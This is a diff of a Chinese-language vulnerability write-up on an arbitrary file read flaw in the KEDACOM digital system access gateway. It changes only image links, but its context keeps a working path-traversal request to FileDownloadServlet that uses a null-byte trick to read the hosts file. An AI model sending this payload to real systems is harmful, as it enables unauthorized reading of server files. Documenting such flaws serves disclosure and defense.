@@ -20,7 +20,7 @@ KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通�
 
 登录页面如下
 
-![](image/ked-1.png)
+![](http://wikioss.peiqi.tech/vuln/ked-1.png)
 
 使用POC读取 /etc/hosts
 
@@ -28,4 +28,4 @@ KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通�
 /gatewayweb/FileDownloadServlet?fileName=pq.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
 ```
 
-![](image/ked-2.png)
+![](http://wikioss.peiqi.tech/vuln/ked-2.png)
